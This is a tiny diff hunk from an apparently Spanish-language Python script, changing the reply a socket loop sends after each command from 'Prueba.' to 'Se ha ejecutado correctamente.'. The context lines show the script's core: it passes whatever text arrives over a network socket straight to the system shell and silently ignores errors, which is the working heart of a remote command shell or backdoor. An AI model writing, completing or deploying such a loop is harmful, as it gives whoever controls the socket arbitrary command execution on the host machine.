@@ -13,5 +13,5 @@ if __name__ == '__main__':
 			system(sock.recv(1024).decode())
 		except:
 			pass
-		finally:
-			sock.send("Prueba.".encode())
+		else:
+			sock.send("Se ha ejecutado correctamente.".encode())
